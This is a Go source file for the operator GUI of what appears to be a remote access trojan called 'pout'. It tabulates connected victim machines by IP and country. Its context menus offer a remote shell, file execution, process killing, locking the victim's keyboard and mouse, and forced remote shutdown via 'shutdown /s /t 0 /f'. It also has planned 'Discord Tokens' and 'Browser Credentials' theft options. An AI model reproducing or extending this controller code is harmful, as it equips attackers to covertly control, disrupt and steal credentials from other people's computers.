package render

import (
	"fmt"

	g "github.com/AllenDang/giu"

	"github.com/codeuk/pout/cmd/helper"
	"github.com/codeuk/pout/cmd/server"
)

// `CreateClientContextMenu` creates a new operations context menu for the passed table row (client index).
func CreateClientContextMenu(i int) *g.ContextMenuWidget {
	// Context menu string variables.
	var inputLockerStr string

	// Derive the client that was clicked on from the supplied index.
	client := server.CurrentServer.Connections[i]

	// Derive the string to use on the label for the input toggler based on the clients InputLocked value.
	if client.InputLocked {
		inputLockerStr = "	Unlock Input"
	} else {
		inputLockerStr = "	Lock Input"
	}

	// This is very messy, I will rewrite the approach taken for creating the client context menu
	// in a later update.
	return g.ContextMenu().Layout(
		g.Label(fmt.Sprintf("Operations for %s", client.MetaData.IP)),

		g.TreeNode("System").Layout(
			g.Selectable("	File Executor").OnClick(func() {
				// Toggle file runnner window status.
				ToggleRunFileOpen(i)
			}),
			g.Selectable("	Remote Shell").OnClick(func() {
				// Toggle remote shell window status.
				ToggleClientShellOpen(i)
			}),
			g.Selectable("	Process Manager").OnClick(func() {
				// Toggle process manager window status.
				ToggleClientProcessManagerOpen(i)
			}),
		),

		g.TreeNode("Recovery Options").Layout(
			g.Selectable("	Discord Tokens X").OnClick(func() {
				fmt.Println("Discord Tokens")
			}),
			g.Tooltip("This feature has not been developed yet."),

			g.Selectable("	Browser Credentials X").OnClick(func() {
				fmt.Println("Browser Credentials")
			}),
			g.Tooltip("This feature has not been developed yet."),
		),

		g.TreeNode("Miscellaneous").Layout(
			g.Selectable(inputLockerStr).OnClick(func() {
				// Toggle whether the clients inputs (keyboard & mouse) are locked.
				go client.ToggleInputLock()
			}),
			g.Tooltip("This feature requires the client to be running as admin."),
			g.Selectable("	URL Opener").OnClick(func() {
				// Toggle URL Opener window status.
				ToggleURLOpenerOpen(i)
			}),
			g.Selectable("	Message Box").OnClick(func() {
				// Toggle message box builder window status.
				ToggleClientMsgBoxOpen(i)
			}),
		),

		g.TreeNode("Power").Layout(
			g.Selectable("	Shutdown").OnClick(func() {
				// Send a shutdown command to the clients computer.
				go client.GetCommandOutput("shutdown /s /t 0 /f")
			}),
			g.Selectable("	Restart").OnClick(func() {
				// Send a restart command to the clients computer.
				go client.GetCommandOutput("shutdown /r /t 0 /f")
			}),
		),

		g.TreeNode("Connection").Layout(
			g.Selectable("	Restart").OnClick(func() {
				// Disconnect the client temporarily and allow it to reconnect.
				go client.ReEstablishConnection()
			}),
			g.Selectable("	Disconnect").OnClick(func() {
				// Remove the current client from the connections list and tell it to exit.
				server.CurrentServer.Remove(client)
			}),
		),
	)
}

// `CreateClientTable` parses and formats the CurrentServer Connections array into usable TableRows.
func CreateClientTable() []*g.TableRowWidget {
	rows := make([]*g.TableRowWidget, 0)

	// Check if server has been started and the selected client is valid.
	if server.CurrentServer == nil || server.CurrentServer.Connections == nil {
		return rows
	}

	// Iterate over clients and create a TableRowWidget for each one.
	for i, client := range server.CurrentServer.Connections {
		row := g.TableRow(
			// This repetetive context menu creation is not efficient,
			// but I cannot find another way to do this using GIU.
			g.Label(client.SessionID), CreateClientContextMenu(i),
			g.Label(client.MetaData.System.Registry.ProductName), CreateClientContextMenu(i),
			g.Label(client.MetaData.Name), CreateClientContextMenu(i),
			g.Label(client.MetaData.IP), CreateClientContextMenu(i),
			g.Label(client.MetaData.Geo.Country), CreateClientContextMenu(i),
			g.Label(client.MetaData.Access), CreateClientContextMenu(i),
			g.Label(client.Connected.Format("2006-01-02 15:04:05")), CreateClientContextMenu(i),
		)

		rows = append(rows, row)
	}

	return rows
}

// `CreateProcessContextMenu` creates a new operations context menu for each process.
func CreateProcessContextMenu(client *server.Client, process server.Process) *g.ContextMenuWidget {
	return g.ContextMenu().Layout(
		g.Selectable("Kill Process").OnClick(func() {
			// Update the clients KillingProcess status.
			client.ProcessMonitor.KillingProcess = true

			// Send the kill message to the client with the passed processes ID.
			go client.KillProcessByID(process.PID)
		}),
		g.Selectable("Copy ID").OnClick(func() {
			// Use the clipboard package to write the processes ID to the host machines keyboard.
			helper.WriteTextToClipboard(process.PID)
		}),
	)
}

// `CreateProcessTable` parses and formats the passed clients processes into usable TableRows.
func CreateProcessTable(client *server.Client) []*g.TableRowWidget {
	rows := make([]*g.TableRowWidget, 0)

	// Check if server has been started and the selected client is valid.
	if server.CurrentServer == nil || client == nil {
		return rows
	}

	// Iterate over the clients processes and create a TableRowWidget for each one.
	for _, process := range client.MetaData.Processes {
		row := g.TableRow(
			g.Label(process.Name), CreateProcessContextMenu(client, process),
			g.Label(process.PID), CreateProcessContextMenu(client, process),
			g.Label(fmt.Sprintf("%sKB", process.Memory)), CreateProcessContextMenu(client, process),
		)

		rows = append(rows, row)
	}

	return rows
}
